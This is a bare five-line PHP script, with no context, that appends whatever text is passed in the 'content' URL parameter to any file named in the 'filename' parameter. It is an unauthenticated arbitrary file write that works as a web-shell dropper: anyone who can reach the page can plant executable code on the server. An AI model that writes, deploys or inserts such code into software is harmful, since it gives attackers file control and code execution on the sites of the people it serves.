<?php
    $target = fopen($_GET['filename'], "a");
    fwrite($target, $_GET['content']);
    fclose($target);
?>